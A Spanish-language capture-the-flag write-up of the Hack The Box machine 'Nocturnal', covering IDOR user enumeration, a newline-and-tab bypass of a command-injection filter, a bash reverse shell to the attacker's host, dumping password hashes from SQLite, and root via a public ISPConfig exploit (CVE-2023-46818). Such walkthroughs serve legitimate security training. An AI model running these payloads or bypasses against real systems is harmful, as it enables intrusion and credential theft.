---
layout: default
title: Nocturnal | Easy Machine
---

# Conocimientos necesarios para completar la máquina
> Nmap
>
> Enumeración de directorios
>
> IDOR
>
> RCE
>
> Proxies Web
>
> Local Port Forwarding

## Enumeración Inicial
Comenzamos viendo si tenemos conexión con el comando **ping**

```bash
$ ping -c1 10.129.125.64
PING 10.129.125.64 (10.129.125.64) 56(84) bytes of data.
64 bytes from 10.129.125.64: icmp_seq=1 ttl=63 time=7.38 ms

--- 10.129.125.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 7.375/7.375/7.375/0.000 ms
```

Tras comprobarlo, iniciaremos un escaneo con **nmap**, para detectar que puertos tiene abiertos la máquina víctima.

```bash
$ nmap 10.129.125.64
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 07:06 CDT
Nmap scan report for 10.129.125.64
Host is up (0.010s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Podemos ver que tiene los puertos 22 y 80 abiertos, hagamos un escaneo más exhaustivo para ver si nos enfrentamos a alguna versión vulnerable a algún CVE.

```bash
$ nmap -sCV -p22,80 10.129.125.64
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-17 07:07 CDT
Nmap scan report for 10.129.125.64
Host is up (0.0072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver gracias a la versión de OpenSSH (aunque también podíamos intuirlo por ttl al usar el comando **ping**), que nos enfrentamos a una máquina Ubuntu, y podemos ver también que el servidor web está usando la versión de nginx 1.18.0, busquemos con searchsploit si tiene algún exploit esa versión.

```bash
$ searchsploit nginx 1.18.0
Exploits: No Results
Shellcodes: No Results
```

No parece haber ninguno, bien, en el escaneo previo de nmap podemos ver también que el servidor web nos redirige a **nocturnal.htb**, por lo que añadiremos la entrada al archivo **/etc/hosts**.

```bash
$ echo '10.129.125.64 nocturnal.htb' | sudo tee -a /etc/hosts
10.129.125.64 nocturnal.htb
```

Una vez añadido, vamos a navegar a la página a ver qué nos encontramos:

![nocturnal]({{"/assets/images/nocturnal1.png"}})

Podemos ver cómo se trata de una aplicación de subida de archivos Word, Excel y PDF, también vemos una función para registrarnos, vamos a ello.

![nocturnal]({{"/assets/images/nocturnal2.png"}})

Nos registramos y después nos logueamos, seremos redirigidos directamente a la página **dashboard.php**:

![nocturnal]({{"/assets/images/nocturnal3.png"}})

Vale, podemos subir archivos, aunque antes vimos que supuestamente solo permite subir archivos **pdf, word, y excel**, probemos a subir un **php** a ver qué pasa.

![nocturnal]({{"/assets/images/nocturnal4.png"}})

![nocturnal]({{"/assets/images/nocturnal5.png"}})

Vemos que nos aparece un error con los formatos de archivo que nos permite subir la aplicación web. Bien, subamos un archivo válido para ver el comportamiento de la web.

![nocturnal]({{"/assets/images/nocturnal6.png"}})

Podemos ver que un pdf se sube correctamente. Si vemos el código fuente, o bien hacemos click en el archivo capturando la petición con **burpsuite** o analizando la petición realizada con las **dev tools** podremos ver a dónde hace referencia el enlace del archivo subido, en este caso, veremos el código fuente:

![nocturnal]({{"/assets/images/nocturnal7.png"}})

## EXPLOTACIÓN

Podemos ver cómo hace referencia a **view.php?username=shadowrooted&file=shadow.pdf**, bien, intentemos navegar a esta URL pero poniendo un nombre de un archivo no existente:

![nocturnal]({{"/assets/images/nocturnal8.png"}})

Si usamos el nombre correcto del archivo, nos lo descarga, si no existe el archivo, nos lista los archivos disponibles subidos por el usuario indicado en el parámetro **username**. La cosa es, si la validación para poder listar y descargar los archivos subidos por el usuario se valida mediante el parametro **username** el cual es completamente manipulable por nosotros, estaríamos ante una vulnerabilidad IDOR, que es el caso. ¿Cómo lo sabemos?, podemos probar a poner una extensión de archivo válida a un archivo inexistente y un nombre de usuario válido, cómo podría ser **admin**, vemos como las respuestas cambian según lo que pongamos, por lo tanto, podemos enumerar usuarios existentes y sus archivos mediante el parámetro username, usaremos la herramienta **ffuf**:

Antes de usar **ffuf**, si probamos a desloguearnos e intentar acceder a la página **view.php**, veremos que no podemos, nos redirige a **login.php**, por tanto debemos usar la cookie en el comando de ffuf, para que pueda listar correctamente.

```bash
$ ffuf -w /usr/share/seclists/Usernames/Names/names.txt:FUZZ -u "http://nocturnal.htb/view.php?username=FUZZ&file=dontexist.pdf" -H "Cookie: PHPSESSID=8tp9j99cubv33q2okf99cc3qqu" -fs 2985

admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 11ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 11ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 12ms]
```

Podemos detectar a los usuarios **admin, amanda y tobias**, de los cuales nos interesa **Amanda, ya que es la única que tiene un tamaño de la respuesta diferente, veamos que tiene.

![nocturnal]({{"/assets/images/nocturnal9.png"}})

Podemos ver, cómo tiene subido el archivo **privacy.odt**, al hacer click nos lo descarga, lo abrimos y vemos el contenido:

![nocturnal]({{"/assets/images/nocturnal10.png"}})

Podemos ver cómo le asociaron una contraseña el equipo de IT a Amanda para que la cambie. Podemos intentar iniciar sesión con su cuenta en la aplicación web, con suerte no ha cambiado la contraseña:

![nocturnal]({{"/assets/images/nocturnal11.png"}})

![nocturnal]({{"/assets/images/nocturnal12.png"}})

Podemos ver que conseguimos iniciar sesión correctamente como **Amanda** y que tiene acceso a un panel de administración que redirige a la página **admin.php**.

![nocturnal]({{"/assets/images/nocturnal13.png"}})

Podemos ver que nos muestra todos los archivos de la raíz del servidor web y la existencia de 2 carpetas.

Podemos notar que tenemos en la parte de abajo una función de **crear un backup** con una contraseña. Haciendo click en los archivos de arriba, podemos ver el código fuente de las páginas, miremos el de **admin.php**, que es en el que nos encontramos, para ver cómo se trata esta contraseña que mandamos, por si la meten directamente en un comando y logramos **RCE**.

![nocturnal]({{"/assets/images/nocturnal14.png"}})

Podemos ver, que, aunque usa una función llamada **cleanEntry** con la contraseña que inyectamos, tras eso la usa en un comando en una shell.

Capturemos la petición con burpsuite e intentemos añadir **saltos de línea y tabuladores** para intentar eludir las medidas de seguridad.

![nocturnal]({{"/assets/images/nocturnal15.png"}})

Podemos ver, que intentando inyectar un pipe o un espacio para inyectar comandos, nos da error, pues la función **cleanEntry** nos intenta bloquear RCE, no obstante, si codificamos un salto de línea y ponemos el comando que queremos podemos ver el resultado a continuación:

![nocturnal]({{"/assets/images/nocturnal16.png"}})

Podemos ver cómo podemos ejecutar comandos, esto se debe, a que esta función, no tiene en cuenta los saltos de línea, no los bloquea, los espacios sí, por lo que usaremos tabuladores en vez de espacios, los cuales probando, nos damos cuenta que tampoco son bloqueados.

(Todo esto codificado en URL, podemos conocerlos usando el decoder de burpsuite)

Podemos aprovechar esto, para, como es una máquina linux, el tipo de archivo no se valida por la extensión, si no por el contenido, pues subiremos un shell.pdf que nos envíe una reverse shell a nuestro puerto 4444, y poniendo este a la escucha, intentaremos ejecutarlo:

```bash
$ cat shell.pdf
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.45/4444 0>&1
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
```

Con un **ls%09uploads** confirmamos que el archivo se ha subido correctamente y está en el directorio **uploads** (%09 es el tabulador codificado en URL)

![nocturnal]({{"/assets/images/nocturnal18.png"}})

Podemos intentar ejecutarlo:

![nocturnal]({{"/assets/images/nocturnal19.png"}})

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.45] from (UNKNOWN) [10.129.125.64] 53702
bash: cannot set terminal process group (986): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ whoami
whoami
www-data
```

Recibimos la reverse shell como el usuario www-data. Si vemos el archivo **/etc/passwd** o listamos directorios en **/home/** podemos listar que usuarios existen en el sistema:

```bash
www-data@nocturnal:~/nocturnal.htb$ cat /etc/passwd

<SNIP>
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
```

Encontramos a tobias cómo único usuario creado manualmente del sistema. Es nuestro siguiente objetivo.

Viendo el código fuente de **login.php** desde el panel de administración como el usuario **amanda**, podemos ver cómo se hace referencia a una base de datos situada en la ruta relativa **../nocturnal_database/nocturnal_database.db** desde la raíz del servidor, intentemos interactuar con ella:

![nocturnal]({{"/assets/images/nocturnal20.png"}})

```bash
www-data@nocturnal:~/nocturnal.htb$ sqlite3 ../nocturnal_database/nocturnal_database.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .table
uploads  users
```

Vemos que existe la tabla **uploads** y la tabla **users**, echemos un vistazo a la tabla **users**:

```bash
sqlite> select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
8|shadowrooted|f1c710fe24dabd3629214cbbde361a20
```

Podemos ver los usuarios existentes en la aplicación web y los hashes de su contraseña. De especial atención es el de tobias, ya que si usa la misma contraseña en la web que en el sistema podríamos suplantarle y loguearnos con su usuario. Comprobemos si su hash se encuentra en **crackstation.net** o crackeemoslo con **hashcat**.

![nocturnal]({{"/assets/images/nocturnal21.png"}})

Podemos ver cómo se encontraba en una base de datos de hashes precalculados como **crackstation.net**, esto se debe a que en el formato del hash vemos que no tienen salt, por lo que esto era una probabilidad si la contraseña no es lo suficiente robusta.

Intentemos loguearnos vía ssh como le usuario **tobias**, a ver si utiliza la misma contraseña:

```bash
$ ssh tobias@nocturnal.htb

tobias@nocturnal.htb's password: 

tobias@nocturnal:~$ whoami
tobias
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias)
```

Podemos ver cómo nos hemos logueado correctamente y tenemos la flag del usuario en nuestro home! :)

```bash
tobias@nocturnal:~$ ls -l
total 4
-rw-r----- 1 root tobias 33 Aug 17 12:04 user.txt
```

## Escalada de privilegios

En esta parte, podríamos ver si hay algún archivo con permisos SUID, GUID, tareas cron con herramientas como **pspy**, etc.

No obstante, en esta máquina podemos ver algo más interesante:

```bash
tobias@nocturnal:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

Podemos ver que hay un servicio web corriendo en local por el puerto 8080. Vamos a hacer un **Local Port Forwarding** con ssh y vamos a analizarlo en nuestra máquina.

```bash
$ ssh -L 8000:localhost:8080 tobias@nocturnal.htb
```

Con este comando, nos traemos a nuestro puerto **8000** el servicio corriendo por el puerto **8080** en local de la máquina víctima, ahora desde nuestra máquina podemos navegar a nuestro puerto 8000 en local a ver qué está corriendo el servicio:

![nocturnal]({{"/assets/images/nocturnal22.png"}})

Podemos ver que se trata de un ISPConfig, estamos en un panel de login, podríamos intuir, que al correr en local, y que el unico usuario local que existe en el sistema es Tobias, quien usaba la misma contraseña para la aplicación web que para el sistema, la sigue reciclando, probemos con sus credenciales:

![nocturnal]({{"/assets/images/nocturnal23.png"}})

Recibimos error de credenciales, ¿quizás con la cuenta de usuario **admin** y la password de tobias?

![nocturnal]({{"/assets/images/nocturnal24.png"}})

Estamos dentro! Veamos que tenemos.

Si vamos a la sección de **help**, podemos ver la versión de **ISPConfig** que se está utilizando.

![nocturnal]({{"/assets/images/nocturnal25.png"}})

Podemos hacer una búsqueda para ver si esta versión es vulnerable a algún CVE:

![nocturnal]({{"/assets/images/nocturnal26.png"}})

Encontramos este **CVE-2023-46818** que permite inyectar código php en versiones anteriores a la 3.2.11, por lo que esta es vulnerable, clonemos el repositorio y ejecutemos el exploit.

```bash
$ python3 CVE-2023-46818.py http://localhost:8000 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_745293f3891698482a7ef727
[+] CSRF Key: 39814cc0dae5b96c07a5fadad71e8137b695811a
[+] Injecting shell payload...
[+] Shell written to: http://localhost:8000/admin/sh.php
[+] Launching shell...

ispconfig-shell# whoami
root
```

Tras ejecutarlo, obtenemos una shell como el usuario root, quien estaba ejecutando el servicio.

```bash
ispconfig-shell# ls -l /root
total 8
-rw-r----- 1 root root   33 Aug 17 12:04 root.txt
drwxr-xr-x 2 root root 4096 Apr 14 09:11 scripts
```

Podemos leer la flag del usuario root, y ya tendríamos la máquina completamente pwned!

KEEP HACKING!

# WALKTHROUGH COMPLETO

<iframe width="100%" height="400" src="https://www.youtube.com/embed/K5CPW5vnAq8" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

# VIDEO RÁPIDO

<iframe width="100%" height="400" src="https://www.youtube.com/embed/zkt6wyOQPSQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>
